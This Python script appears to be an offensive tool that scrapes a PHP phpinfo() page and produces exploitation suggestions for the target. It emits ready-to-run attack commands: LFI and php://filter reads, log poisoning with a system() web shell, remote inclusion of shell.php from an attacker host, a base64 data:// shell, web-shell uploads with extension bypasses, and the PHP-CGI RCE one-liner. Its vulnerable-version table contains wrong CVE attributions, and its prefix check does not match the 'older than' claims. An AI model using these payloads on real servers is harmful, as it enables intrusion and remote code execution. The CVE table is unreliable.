#!/usr/bin/env python3
"""
PHPInfo Attack Path Analyzer with Enhanced Checks, Exploitation Suggestions,
and Dual Output (Colorized Plain-Text + Markdown)

This script fetches and analyzes a phpinfo() page to extract key configuration
details, OS/server information, registered PHP streams, file upload settings,
and additional .ini files. Based on these findings, it produces an actionable,
color-coded report and also a Markdown version of the report (without ANSI colors)
that includes concrete exploitation test suggestions (with sample curl commands).

Usage:
    python3 phpinfo_attack_paths.py --url http://example.com/test.php
"""

import sys
import re
import argparse
import requests
from bs4 import BeautifulSoup
import os
from datetime import datetime
from urllib.parse import urlparse
from colorama import init, Fore, Style

# Initialize Colorama (for colored output in terminal and plain-text file).
init(autoreset=True)

# Known vulnerable PHP versions (version prefix, vulnerability note).
KNOWN_VULNERABLE_VERSIONS = [
    # PHP 8.x Vulnerabilities
    ("8.1.0-dev", "PHP 8.1.0-dev had a backdoor incident (March 2021) allowing RCE via User-Agentt header"),
    ("8.0.0", "Early PHP 8.0.x versions had multiple vulnerabilities including potential RCE via OPcache"),
    
    # PHP 7.x Vulnerabilities
    ("7.4.21", "PHP < 7.4.21 vulnerable to buffer overflow in array_walk()/array_walk_recursive() (CVE-2021-21705)"),
    ("7.3.33", "PHP < 7.3.33 vulnerable to DOS and potential RCE via multibyte conversion (CVE-2021-21702)"),
    ("7.2.34", "PHP < 7.2.34 vulnerable to potential RCE via session deserialization (CVE-2019-11043)"),
    ("7.1.33", "PHP < 7.1.33 vulnerable to heap buffer overflow in mb_ereg_replace() (CVE-2019-11041)"),
    ("7.0.33", "PHP < 7.0.33 vulnerable to RCE via imap_open() (CVE-2018-19518)"),
    
    # PHP 5.x Critical Vulnerabilities
    ("5.6.40", "PHP 5.6.40 and below are EOL, multiple RCE vulnerabilities including CVE-2019-11043"),
    ("5.5.38", "PHP 5.5.38 vulnerable to multiple RCEs including fastcgi fpm (CVE-2016-5385)"),
    ("5.4.45", "PHP 5.4.45 vulnerable to multiple RCEs including CVE-2016-5773 (str_repeat)"),
    ("5.4.0", "PHP 5.4.0 CGI query string parameter vulnerability allows RCE (CVE-2012-1823)"),
    ("5.3.29", "PHP 5.3.29 vulnerable to RCE via heap corruption in exif_thumbnail_extract()"),
    ("5.3.12", "PHP 5.3.12 vulnerable to RCE via apache_child_terminate() (CVE-2012-2311)"),
    ("5.3.9", "PHP 5.3.9 vulnerable to hash collision DOS and CGI RCE (CVE-2011-4885)"),
    ("5.3.7", "PHP 5.3.7 has critical LFI vulnerability in error_log() function"),
    ("5.3.6", "PHP 5.3.6 vulnerable to RCE via curl_setopt() (CVE-2011-3182)"),
    ("5.3.0", "PHP 5.3.0 has multiple LFI/RFI vulnerabilities including realpath bypass"),
    
    # PHP 5.2.x Series (Highly Vulnerable)
    ("5.2.17", "PHP 5.2.17 vulnerable to multiple RCEs including phpinfo() exploit (CVE-2011-3268)"),
    ("5.2.14", "PHP 5.2.14 vulnerable to RCE via safe_mode bypass (CVE-2010-2531)"),
    ("5.2.12", "PHP 5.2.12 vulnerable to RCE via substr_compare() (CVE-2010-1917)"),
    ("5.2.10", "PHP 5.2.10 vulnerable to RCE via session handling (CVE-2009-4143)"),
    ("5.2.9", "PHP 5.2.9 vulnerable to RCE via posix_mkfifo() (CVE-2009-2687)"),
    ("5.2.0", "PHP 5.2.0 has multiple critical vulnerabilities including LFI via include()"),
    
    # PHP 5.1.x and 5.0.x (Ancient, Multiple Vulnerabilities)
    ("5.1.6", "PHP 5.1.6 vulnerable to RCE via unserialize() (CVE-2007-1581)"),
    ("5.1.2", "PHP 5.1.2 has critical RCE via GD extension (CVE-2006-4625)"),
    ("5.1.0", "PHP 5.1.0 vulnerable to multiple RCEs including mail() injection"),
    ("5.0.5", "PHP 5.0.5 vulnerable to RCE via zip extension (CVE-2006-2563)"),
    ("5.0.4", "PHP 5.0.4 vulnerable to RCE via PCRE (CVE-2006-1549)"),
    ("5.0.0", "PHP 5.0.0 has numerous RCE vulnerabilities including memory corruption"),
    
    # PHP 4.x (Extremely Outdated and Vulnerable)
    ("4.4.9", "PHP 4.4.9 multiple RCE vulnerabilities including memory corruption"),
    ("4.4.0", "PHP 4.4.0 vulnerable to multiple RCEs including format string attacks"),
    ("4.3.11", "PHP 4.3.11 vulnerable to RCE via multiple vectors including memory corruption"),
    ("4.3.0", "PHP 4.3.0 has critical vulnerabilities including RCE via file upload"),
    ("4.2.0", "PHP 4.2.0 vulnerable to multiple RCEs including register_globals abuse"),
    ("4.1.0", "PHP 4.1.0 has numerous security issues including RCE via global variables"),
    ("4.0.0", "PHP 4.0.0 multiple critical vulnerabilities including RCE via include()"),
    
    # Generic Version Checks
    ("8.", "PHP 8.x - Check for known vulnerabilities and misconfigurations"),
    ("7.", "PHP 7.x - Check for known vulnerabilities and CGI/FastCGI misconfigurations"),
    ("5.6", "PHP 5.6.x is EOL - Multiple known vulnerabilities including potential RCE"),
    ("5.5", "PHP 5.5.x is EOL - Multiple RCE vulnerabilities if unpatched"),
    ("5.4", "PHP 5.4.x is EOL - Known CGI RCE vulnerabilities (CVE-2012-1823)"),
    ("5.3", "PHP 5.3.x is EOL - Multiple RCE and LFI vulnerabilities"),
    ("5.2", "PHP 5.2.x is EOL - Numerous RCE, LFI, and RFI vulnerabilities"),
    ("5.1", "PHP 5.1.x is EOL - Critical RCE and file inclusion vulnerabilities"),
    ("5.0", "PHP 5.0.x is EOL - Multiple critical RCE vulnerabilities"),
    ("4.", "PHP 4.x is extremely outdated - Multiple critical vulnerabilities")
]

### PARSING FUNCTIONS ###

def fetch_phpinfo(url):
    """Fetch the phpinfo() page from the given URL."""
    try:
        response = requests.get(url, timeout=10)
        if response.status_code != 200:
            print(f"{Fore.RED}[ERROR] HTTP status code {response.status_code} received.")
            sys.exit(1)
        return response.text
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Failed to fetch URL: {e}")
        sys.exit(1)

def parse_phpinfo(html):
    """
    Parse the phpinfo() HTML to extract key configuration details and extra directives.
    Extracted items include:
      - PHP_Version
      - Server_API (CGI/FPM/etc)
      - allow_url_include, allow_url_fopen, open_basedir, disable_functions,
      - suhosin.simulation, file_uploads, upload_max_filesize, post_max_size,
      - expose_php, display_errors, log_errors,
      - session.save_path, session.use_strict_mode, session.cookie_httponly,
      - enable_dl, cgi.fix_pathinfo, memory_limit, register_globals, upload_tmp_dir,
      - session.upload_progress.enabled, xdebug.remote_enable,
      - Loaded_Configuration_File
    """
    soup = BeautifulSoup(html, 'html.parser')
    config = {}

    # Server API (CGI/FPM/etc)
    server_api = soup.find(string=re.compile("Server API", re.I))
    if server_api:
        api_value = server_api.find_next("td")
        if api_value:
            config["Server_API"] = api_value.text.strip()

    # PHP Version.
    header = soup.find('h1')
    if header and "PHP Version" in header.text:
        match = re.search(r'PHP Version\s*([\d\.]+)', header.text)
        if match:
            config['PHP_Version'] = match.group(1)

    # Desired directives.
    desired = ['allow_url_include', 'allow_url_fopen', 'open_basedir', 'disable_functions',
               'suhosin.simulation', 'file_uploads', 'upload_max_filesize', 'post_max_size',
               'expose_php', 'display_errors', 'log_errors', 'session.save_path', 
               'session.use_strict_mode', 'session.cookie_httponly', 'enable_dl',
               'cgi.fix_pathinfo', 'memory_limit', 'register_globals', 'upload_tmp_dir',
               'session.upload_progress.enabled', 'xdebug.remote_enable']
    rows = soup.find_all('tr')
    for row in rows:
        cells = row.find_all(['td', 'th'])
        if len(cells) >= 2:
            directive = cells[0].get_text(strip=True)
            value = cells[1].get_text(strip=True)
            if directive.lower() in desired:
                config[directive] = value

    # Loaded Configuration File.
    loaded_config = soup.find(string=re.compile("Loaded Configuration File"))
    if loaded_config:
        parent = loaded_config.find_parent('tr')
        if parent:
            cells = parent.find_all('td')
            if len(cells) >= 2:
                config["Loaded_Configuration_File"] = cells[1].get_text(strip=True)
    
    return config

def robust_parse_registered_streams(html):
    """
    Robustly extract the list of registered PHP streams from the phpinfo() page.
    """
    streams = set()
    soup = BeautifulSoup(html, 'html.parser')
    
    # Attempt 1: Table rows with class "e" and corresponding "v".
    cells = soup.find_all("td", class_="e")
    for cell in cells:
        if "registered php streams" in cell.get_text(strip=True).lower():
            sibling = cell.find_next_sibling("td", class_="v")
            if sibling:
                streams_text = sibling.get_text(strip=True)
                streams.update(s.strip().lower() for s in streams_text.split(',') if s.strip())
    
    # Attempt 2: Look in <pre> blocks.
    if not streams:
        pre_tags = soup.find_all("pre")
        for tag in pre_tags:
            text = tag.get_text()
            match = re.search(r"Registered PHP Streams\s*[:\-]?\s*(.+)", text, re.IGNORECASE)
            if match:
                streams_line = match.group(1)
                streams.update(s.strip().lower() for s in streams_line.split(',') if s.strip())
    
    # Attempt 3: Fallback using regex.
    if not streams:
        match = re.search(r"Registered PHP Streams\s*[:\-]?\s*([\w\.,\s]+)", html, re.IGNORECASE)
        if match:
            streams_line = match.group(1)
            streams.update(s.strip().lower() for s in streams_line.split(',') if s.strip())
    
    return list(streams)

def extract_os_details(html):
    """
    Extract OS and server details from the phpinfo() output.
    Typically found in the "System" row.
    """
    soup = BeautifulSoup(html, 'html.parser')
    system_row = soup.find("td", string=re.compile("^System", re.I))
    if system_row:
        parent = system_row.find_parent("tr")
        if parent:
            cells = parent.find_all("td")
            if len(cells) >= 2:
                return cells[1].get_text(strip=True)
    return None

def extract_additional_ini_files(html):
    """
    Extract additional .ini files parsed from the phpinfo() output.
    """
    soup = BeautifulSoup(html, 'html.parser')
    row = soup.find("td", string=re.compile("Additional .ini files parsed", re.I))
    if row:
        parent = row.find_parent("tr")
        if parent:
            cells = parent.find_all("td")
            if len(cells) >= 2:
                return cells[1].get_text(strip=True)
    return None

### EXPLOITATION SUGGESTION FUNCTIONS ###

def analyze_streams(streams):
    """
    Analyze the list of registered streams and return summary messages.
    """
    messages = []
    if streams:
        messages.append(f"{Fore.LIGHTCYAN_EX}Registered streams:{Style.RESET_ALL} {', '.join(streams)}")
        if "phar" in streams:
            messages.append(f"{Fore.LIGHTCYAN_EX}PHAR stream is enabled:{Style.RESET_ALL} PHAR deserialization attacks might be possible.")
        else:
            messages.append(f"{Fore.LIGHTCYAN_EX}PHAR stream is not enabled.{Style.RESET_ALL}")
    else:
        messages.append(f"{Fore.LIGHTCYAN_EX}No registered streams information found.{Style.RESET_ALL}")
    return messages

def generate_stream_attack_paths(streams):
    """
    For each detected stream, provide potential attack vectors and explanations.
    """
    stream_attack_mapping = {
       "phar": "PHAR deserialization: Craft a malicious PHAR archive and try to trigger unserialization.",
       "ftp": "FTP stream: May allow SSRF or file inclusion if remote file access is mishandled.",
       "http": "HTTP stream: Can be abused for SSRF by forcing the server to make requests.",
       "https": "HTTPS stream: Similar to HTTP; verify SSL/TLS settings for potential bypasses.",
       "ftps": "FTPS stream: Potential SSRF if file transfers are not properly secured.",
       "file": "File stream: Critical for LFI; attempt to include sensitive files (e.g., /etc/passwd).",
       "data": "Data stream: Test for injection vulnerabilities when processing untrusted data.",
       "zip": "ZIP stream: Assess for potential archive extraction vulnerabilities.",
       "compress.zlib": "Zlib stream: May be exploited if decompression of untrusted data occurs.",
       "compress.bzip2": "Bzip2 stream: Similar risk as zlib if decompression functions are misused.",
    }
    messages = []
    for stream in streams:
        if stream in stream_attack_mapping:
            if stream == "php":
                stream_name = f"{Fore.MAGENTA}{stream}{Style.RESET_ALL}"
            else:
                stream_name = f"{Fore.LIGHTCYAN_EX}{stream}{Style.RESET_ALL}"
            description = f"{Fore.CYAN}{stream_attack_mapping[stream]}{Style.RESET_ALL}"
            messages.append(f"{stream_name}: {description}")
        else:
            messages.append(f"{Fore.LIGHTCYAN_EX}{stream}{Style.RESET_ALL}: {Fore.CYAN}No specific attack vector defined; review its usage.{Style.RESET_ALL}")
    return messages

def check_known_vulnerable_version(php_version):
    """
    Check if the PHP version is known to be vulnerable.
    """
    for prefix, message in KNOWN_VULNERABLE_VERSIONS:
        if php_version.startswith(prefix):
            return message
    return None

def generate_config_attack_mapping(config):
    """
    For each configuration item, generate actionable test messages.
    Colors are embedded for key status words.
    """
    mapping = {}
    if "PHP_Version" in config:
         mapping["PHP_Version"] = []
         try:
             version_parts = tuple(map(int, config["PHP_Version"].split('.')))
             if version_parts < (7, 0):
                 mapping["PHP_Version"].append(f"{Fore.GREEN}Old PHP version detected{Style.RESET_ALL} – search for public exploits (e.g., on Exploit-DB).")
         except Exception:
             pass
         vuln_message = check_known_vulnerable_version(config["PHP_Version"])
         if vuln_message:
             mapping["PHP_Version"].append(f"{Fore.GREEN}Known vulnerable version{Style.RESET_ALL}: {vuln_message}")
    if "allow_url_include" in config:
         mapping["allow_url_include"] = []
         if config["allow_url_include"].lower() == "on":
             mapping["allow_url_include"].append(f"{Fore.GREEN}Enabled{Style.RESET_ALL} – test for RFI by including a remote file (e.g., http://attacker.com/shell.php).")
         else:
             mapping["allow_url_include"].append(f"{Fore.RED}Disabled{Style.RESET_ALL} – RFI risk is reduced.")
    if "allow_url_fopen" in config:
         mapping["allow_url_fopen"] = []
         if config["allow_url_fopen"].lower() == "on":
             mapping["allow_url_fopen"].append(f"{Fore.GREEN}Enabled{Style.RESET_ALL} – attempt LFI by including sensitive files (e.g., /etc/passwd).")
         else:
             mapping["allow_url_fopen"].append(f"{Fore.RED}Disabled{Style.RESET_ALL} – file inclusion risk is lower.")
    if "open_basedir" in config:
         mapping["open_basedir"] = []
         if config["open_basedir"].strip().lower() in ["", "no value", "none"]:
             mapping["open_basedir"].append(f"{Fore.YELLOW}Not set{Style.RESET_ALL} – test LFI by including /etc/passwd or /proc/self/environ.")
         else:
             mapping["open_basedir"].append(f"{Fore.GREEN}Set{Style.RESET_ALL} – provides filesystem restrictions; verify its scope.")
    if "disable_functions" in config:
         mapping["disable_functions"] = []
         if config["disable_functions"].strip().lower() in ["", "no value"]:
             mapping["disable_functions"].append(f"{Fore.YELLOW}No functions disabled{Style.RESET_ALL} – try executing commands (e.g., system() or exec()).")
         else:
             dangerous_funcs = {"exec", "system", "shell_exec", "passthru", "eval", "assert"}
             disabled = {f.strip().lower() for f in config["disable_functions"].split(',') if f.strip()}
             enabled_dangerous = dangerous_funcs - disabled
             if enabled_dangerous:
                 mapping["disable_functions"].append(f"{Fore.YELLOW}Some dangerous functions enabled{Style.RESET_ALL}: {', '.join(enabled_dangerous)} – test for command execution.")
             else:
                 mapping["disable_functions"].append(f"{Fore.GREEN}All dangerous functions disabled{Style.RESET_ALL} – reduces risk of command execution.")
    if "Loaded_Configuration_File" in config:
         mapping["Loaded_Configuration_File"] = []
         mapping["Loaded_Configuration_File"].append("Review the php.ini file for insecure settings and sensitive credentials.")
    
    # New configuration checks
    if "expose_php" in config:
        mapping["expose_php"] = [f"{Fore.GREEN if config['expose_php'].lower() == 'on' else Fore.RED}PHP version exposure{Style.RESET_ALL} - {'Enabled' if config['expose_php'].lower() == 'on' else 'Disabled'}. Check X-Powered-By headers."]
    
    if "display_errors" in config:
        if config["display_errors"].lower() == "on":
            mapping["display_errors"] = [f"{Fore.RED}Error display enabled{Style.RESET_ALL} - Trigger errors to leak sensitive information via invalid parameters."]
    
    if "session.save_path" in config:
        mapping["session.save_path"] = [f"{Fore.CYAN}Session storage{Style.RESET_ALL} - Try LFI to session files: {config['session.save_path']}/sess_<id>"]
    
    if "enable_dl" in config and config["enable_dl"].lower() == "on":
        mapping["enable_dl"] = [f"{Fore.RED}Dynamic loading enabled{Style.RESET_ALL} - Potential for loading malicious extensions via dl() function."]
    
    if "cgi.fix_pathinfo" in config and config["cgi.fix_pathinfo"] == "1":
        mapping["cgi.fix_pathinfo"] = [f"{Fore.RED}CGI pathinfo fix enabled{Style.RESET_ALL} - Test path traversal via PHP_CGI (CVE-2012-1823)."] 
    
    if "xdebug.remote_enable" in config and config["xdebug.remote_enable"].lower() == "on":
        mapping["xdebug.remote_enable"] = [f"{Fore.RED}XDebug remote enabled{Style.RESET_ALL} - Check for XDebug RCE vulnerabilities (CVE-2017-7272, CVE-2019-11043)."]
    
    if "upload_tmp_dir" in config:
        mapping["upload_tmp_dir"] = [f"{Fore.CYAN}Upload temp directory{Style.RESET_ALL} - Check if path is predictable: {config['upload_tmp_dir']}"]
    
    if "session.upload_progress.enabled" in config and config["session.upload_progress.enabled"].lower() == "on":
        mapping["session.upload_progress.enabled"] = [f"{Fore.CYAN}Upload progress enabled{Style.RESET_ALL} - Potential for race condition LFI attacks."]
    
    return mapping

def generate_exploitation_suggestions(config, streams, target_url):
    """
    Generate focused exploitation suggestions with improved formatting.
    """
    suggestions = []

    # 1. LFI Tests
    if (config.get("allow_url_fopen", "").lower() == "on" or 
        config.get("open_basedir", "").lower() in ["", "no value", "none"]):
        suggestions.append(f"\n{Fore.MAGENTA}[+] LFI VECTORS{Style.RESET_ALL}")
        suggestions.append(f"{Fore.YELLOW}Basic LFI Tests:{Style.RESET_ALL}")
        suggestions.append(f"  curl '{target_url}?page=../../../etc/passwd'")
        suggestions.append(f"  curl '{target_url}?page=../../../proc/self/environ'")
        
        if "php" in streams:
            suggestions.append("\n    PHP Filter LFI:")
            suggestions.append(f"    curl '{target_url}?page=php://filter/convert.base64-encode/resource=index.php'")
            suggestions.append(f"    curl '{target_url}?page=php://filter/convert.base64-encode/resource=config.php'")
        
        suggestions.append("\n    Log Poisoning:")
        suggestions.append(f"    curl '{target_url}' -H '<?php system($_GET[\"cmd\"]); ?>'")
        suggestions.append(f"    curl '{target_url}?page=../../../var/log/apache2/access.log&cmd=id'")

    # 2. RFI Tests - If Enabled
    if config.get("allow_url_include", "").lower() == "on":
        suggestions.append(f"\n{Fore.MAGENTA}RFI Tests:{Style.RESET_ALL}")
        suggestions.append("    Host this file on your server (shell.php):")
        suggestions.append("    <?php system($_GET['cmd']); ?>")
        suggestions.append("\n    Then try:")
        suggestions.append(f"    curl '{target_url}?page=http://YOUR-IP/shell.php&cmd=id'")
        
        if "data" in streams:
            suggestions.append("\n    Data Wrapper RFI:")
            suggestions.append(f"    curl '{target_url}?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8%2B&cmd=id'")

    # 3. File Upload + LFI Chain
    if config.get("file_uploads", "").lower() == "on":
        suggestions.append(f"\n{Fore.MAGENTA}File Upload + LFI Chain:{Style.RESET_ALL}")
        suggestions.append("    1. Create shell.php:")
        suggestions.append("    <?php system($_GET['cmd']); ?>")
        suggestions.append("\n    2. Try uploading with different extensions:")
        suggestions.append("    .php, .php.jpg, .php;.jpg, .php%00.jpg, .php.jpeg, .php5, .phtml")
        suggestions.append("\n    3. If upload successful, try including via LFI:")
        upload_path = config.get("upload_tmp_dir", "/tmp")
        suggestions.append(f"    curl '{target_url}?page={upload_path}/shell.php&cmd=id'")

    # 4. PHP Object Injection (if vulnerable version detected)
    if "phar" in streams and any(v in config.get("PHP_Version", "") for v in ["5.", "7.0", "7.1"]):
        suggestions.append(f"\n{Fore.MAGENTA}PHP Object Injection via PHAR:{Style.RESET_ALL}")
        suggestions.append("    1. Create malicious PHAR file with PHPGGC")
        suggestions.append("    2. Upload it with image extension (exploit.jpg)")
        suggestions.append(f"    3. curl '{target_url}?page=phar://path/to/uploads/exploit.jpg'")

    # 5. Command Injection (if dangerous functions enabled)
    if config.get("disable_functions", "").lower() in ["", "no value"]:
        suggestions.append(f"\n{Fore.MAGENTA}Command Injection Tests:{Style.RESET_ALL}")
        suggestions.append("    Try these PHP functions:")
        suggestions.append("    system(), exec(), shell_exec(), passthru()")
        suggestions.append("\n    Example payloads:")
        suggestions.append(f"    curl '{target_url}?cmd=system(\"id\");'")
        suggestions.append(f"    curl '{target_url}' --data 'cmd=passthru(\"id\");'")

    # 6. CGI/FastCGI RCE (if detected)
    if config.get("Server_API", "").lower().startswith(("cgi", "fast")):
        suggestions.append(f"\n{Fore.MAGENTA}CGI/FastCGI RCE:{Style.RESET_ALL}")
        suggestions.append("    Try PHP-CGI RCE (CVE-2012-1823):")
        suggestions.append(f"    curl '{target_url}?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input' -d '<?php system(\"id\"); ?>'")
        suggestions.append(f"    curl '{target_url}?-s' # Source code disclosure")

    return suggestions

def generate_additional_suggestions(config, html, target_url):
    """
    Generate extra suggestions based on additional environment details.
    Improved formatting for readability.
    """
    suggestions = []
    
    # OS & Server Details
    os_details = extract_os_details(html)
    if os_details:
        suggestions.append(f"{Fore.LIGHTCYAN_EX}OS & Server Details:{Style.RESET_ALL} {os_details}")
        suggestions.append(f"    Test: Run 'curl -I {target_url}' to check server headers for version info.")
    
    # Additional .ini Files
    additional_ini = extract_additional_ini_files(html)
    if additional_ini:
        suggestions.append(f"{Fore.LIGHTCYAN_EX}Additional .ini Files:{Style.RESET_ALL}")
        ini_files = [file.strip() for file in additional_ini.split(',')]
        for ini_file in ini_files:
            suggestions.append(f"    {ini_file}")
        suggestions.append("    Action: Check these files for sensitive data (e.g., database credentials).")
    
    # File Upload Settings
    file_uploads = config.get("file_uploads", "").lower()
    if file_uploads == "on":
        suggestions.append(f"{Fore.LIGHTCYAN_EX}File Uploads:{Style.RESET_ALL} Enabled")
        suggestions.append("    Test: Attempt to upload a PHP shell using a POST request (e.g., curl -F)")
        max_size = config.get("upload_max_filesize", "2M")
        suggestions.append(f"    Sample curl (adjust size to {max_size}):")
        suggestions.append(f'    curl -F "file=@shell.php" -F "submit=1" {target_url}')
    
    # Upload Directory
    if "upload_tmp_dir" in config:
        suggestions.append(f"{Fore.LIGHTCYAN_EX}Upload Temp Directory:{Style.RESET_ALL} Check for leftover files: {config['upload_tmp_dir']}/*")
    
    # Credential Files
    if additional_ini:
        suggestions.append(f"{Fore.LIGHTCYAN_EX}Potential Credential Files:{Style.RESET_ALL}")
        for ini_file in ini_files:
            if any(keyword in ini_file.lower() for keyword in ["mysql", "pdo"]):
                suggestions.append(f"    {ini_file}")
    
    # Deserialization
    suggestions.append(f"{Fore.LIGHTCYAN_EX}Deserialization Issues:{Style.RESET_ALL} Check for insecure usage of unserialize() beyond PHAR deserialization vulnerabilities")
    
    # Environment Variables
    if "Environment" in html:
        suggestions.append(f"{Fore.LIGHTCYAN_EX}Environment Variables:{Style.RESET_ALL} Check $_ENV for credentials via LFI")

    return suggestions

### MARKDOWN REPORT GENERATION ###
def generate_markdown_report(config, attacks, config_mapping, stream_messages, stream_attack_paths, suggestions):
    """
    Generate a Markdown report based on the analysis.
    This report will not include ANSI color codes.
    """
    md_lines = []
    md_lines.append("# PHPInfo Attack Path Analysis Report")
    md_lines.append("")
    
    md_lines.append("## Extracted Configuration")
    for key, value in config.items():
        md_lines.append(f"- **{key}**: `{value}`")
    md_lines.append("")
    
    md_lines.append("## Overall Potential Attack Paths")
    for attack in attacks:
        # Strip ANSI color codes.
        plain_attack = re.sub(r'\x1b\[[0-9;]*m', '', attack)
        md_lines.append(f"- {plain_attack}")
    md_lines.append("")
    
    md_lines.append("## Configuration-based Attack Vectors")
    for key, messages in config_mapping.items():
        md_lines.append(f"### {key}")
        for msg in messages:
            plain_msg = re.sub(r'\x1b\[[0-9;]*m', '', msg)
            md_lines.append(f"- {plain_msg}")
    md_lines.append("")
    
    md_lines.append("## Registered PHP Streams Analysis")
    for message in stream_messages:
        plain_message = re.sub(r'\x1b\[[0-9;]*m', '', message)
        md_lines.append(f"- {plain_message}")
    md_lines.append("")
    
    md_lines.append("## Registered Streams Attack Vectors")
    for msg in stream_attack_paths:
        plain_msg = re.sub(r'\x1b\[[0-9;]*m', '', msg)
        md_lines.append(f"- {plain_msg}")
    md_lines.append("")
    
    md_lines.append("## Exploitation Test Suggestions")
    for suggestion in suggestions:
        plain_suggestion = re.sub(r'\x1b\[[0-9;]*m', '', suggestion)
        md_lines.append(f"- {plain_suggestion}")
    md_lines.append("")
    
    return "\n".join(md_lines)

### OUTPUT FUNCTION ###

def print_and_save_output(config, attacks, config_mapping, stream_messages, stream_attack_paths, suggestions, output_filename, markdown_filename):
    """
    Print the analysis results with colorized output and save two files:
    one plain-text report (with ANSI colors) and one Markdown report (without ANSI colors).
    """
    lines = []

    # --- Extracted Configuration ---
    print(f"{Fore.CYAN}[+] Extracted Configuration:")
    lines.append("[+] Extracted Configuration:")
    for key, value in config.items():
        line = f"  {Fore.YELLOW}{key}{Style.RESET_ALL}: {Fore.LIGHTGREEN_EX}{value}{Style.RESET_ALL}"
        print(line)
        lines.append(f"  {key}: {value}")

    # --- Overall Potential Attack Paths ---
    print(f"\n{Fore.BLUE}[+] Overall Potential Attack Paths:")
    lines.append("\n[+] Overall Potential Attack Paths:")
    for attack in attacks:
        plain_attack = attack  # includes ANSI color codes
        print(f" - {Fore.BLUE}{attack}{Style.RESET_ALL}")
        lines.append(" - " + plain_attack)

    # --- Configuration-based Attack Vectors ---
    print(f"\n{Fore.CYAN}[+] Configuration-based Attack Vectors:")
    lines.append("\n[+] Configuration-based Attack Vectors:")
    for key, messages in config_mapping.items():
        print(f" {Fore.YELLOW}{key}{Style.RESET_ALL}:")
        lines.append(f" {key}:")
        for msg in messages:
            print(f"   - {msg}{Style.RESET_ALL}")
            lines.append("   - " + msg)

    # --- Registered PHP Streams Analysis ---
    print(f"\n{Fore.CYAN}[+] Registered PHP Streams Analysis:")
    lines.append("\n[+] Registered PHP Streams Analysis:")
    for message in stream_messages:
        print(f" - {Fore.LIGHTCYAN_EX}{message}{Style.RESET_ALL}")
        lines.append(" - " + message)

    # --- Registered Streams Attack Vectors ---
    print(f"\n{Fore.CYAN}[+] Registered Streams Attack Vectors:")
    lines.append("\n[+] Registered Streams Attack Vectors:")
    for msg in stream_attack_paths:
        print(f" - {msg}{Style.RESET_ALL}")
        lines.append(" - " + msg)

    # --- Exploitation Test Suggestions ---
    print(f"\n{Fore.MAGENTA}[+] Exploitation Test Suggestions:")
    lines.append("\n[+] Exploitation Test Suggestions:")
    for suggestion in suggestions:
        print(f" - {suggestion}")
        lines.append(" - " + suggestion)

    # Save the colored plain-text output.
    try:
        with open(output_filename, "w") as f:
            for l in lines:
                f.write(l + "\n")
        print(f"\n{Fore.GREEN}[SUCCESS] Colored plain-text report saved to: {output_filename}")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Could not save plain-text output: {e}")
    
    # Generate Markdown report.
    md_report = generate_markdown_report(config, attacks, config_mapping, stream_messages, stream_attack_paths, suggestions)
    try:
        with open(markdown_filename, "w") as f:
            f.write(md_report)
        print(f"{Fore.GREEN}[SUCCESS] Markdown report saved to: {markdown_filename}")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Could not save Markdown report: {e}")

### MAIN FUNCTION ###

def main():
    parser = argparse.ArgumentParser(description="PHPInfo Attack Path Analyzer with Enhanced Checks and Exploitation Suggestions")
    parser.add_argument("--url", required=True, help="URL to the phpinfo() page")
    parser.add_argument("--outdir", default=".", help="Output directory for reports (default: current directory)")
    args = parser.parse_args()

    # Create output directory if it doesn't exist
    try:
        os.makedirs(args.outdir, exist_ok=True)
    except Exception as e:
        print(f"{Fore.RED}[!] Error creating output directory: {e}{Style.RESET_ALL}")
        sys.exit(1)

    print(f"{Fore.BLUE}[*] Fetching phpinfo() page from: {args.url}")
    html = fetch_phpinfo(args.url)

    print(f"{Fore.BLUE}[*] Parsing phpinfo() output...")
    config = parse_phpinfo(html)
    if not config:
        print(f"{Fore.RED}[!] No configuration data found. The phpinfo() page may have an unexpected format.")
        sys.exit(1)

    # Generate overall potential attack paths.
    attacks = []
    if "PHP_Version" in config:
        try:
            version_parts = tuple(map(int, config["PHP_Version"].split('.')))
            if version_parts < (7, 0):
                attacks.append("Old PHP version detected – search for version-specific exploits.")
        except Exception:
            pass
        vuln_message = check_known_vulnerable_version(config["PHP_Version"])
        if vuln_message:
            attacks.append(f"{Fore.RED}Priority: Detected known vulnerable PHP version {config['PHP_Version']} – {vuln_message}{Style.RESET_ALL}")
    if "allow_url_fopen" in config and config["allow_url_fopen"].lower() == "on":
        attacks.append("allow_url_fopen is enabled – may allow LFI/RFI attacks.")
    if "open_basedir" in config and config["open_basedir"].strip().lower() in ["", "no value", "none"]:
        attacks.append("open_basedir is not set – increased risk for LFI.")
    if "disable_functions" in config:
        dangerous_funcs = {"exec", "system", "shell_exec", "passthru", "eval", "assert"}
        if config["disable_functions"].strip().lower() in ["", "no value"]:
            attacks.append("No dangerous functions are disabled – potential for command execution.")
        else:
            disabled = {f.strip().lower() for f in config["disable_functions"].split(',') if f.strip()}
            enabled_dangerous = dangerous_funcs - disabled
            if enabled_dangerous:
                attacks.append("Some dangerous functions are enabled – test for command execution.")

    # Generate configuration attack mapping.
    config_mapping = generate_config_attack_mapping(config)
    
    # Parse registered streams.
    streams = robust_parse_registered_streams(html)
    stream_messages = analyze_streams(streams)
    stream_attack_paths = generate_stream_attack_paths(streams)

    # Generate exploitation suggestions.
    suggestions = generate_exploitation_suggestions(config, streams, args.url)
    extra_suggestions = generate_additional_suggestions(config, html, args.url)
    suggestions.extend(extra_suggestions)

    # Generate output filenames with specified directory
    parsed_url = urlparse(args.url)
    hostname = parsed_url.netloc.replace(":", "_")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_filename = os.path.join(args.outdir, f"phpinfo_attack_paths_{hostname}_{timestamp}.txt")
    markdown_filename = os.path.join(args.outdir, f"phpinfo_attack_paths_{hostname}_{timestamp}.md")

    print_and_save_output(config, attacks, config_mapping, stream_messages, stream_attack_paths, suggestions, output_filename, markdown_filename)

if __name__ == '__main__':
    main()
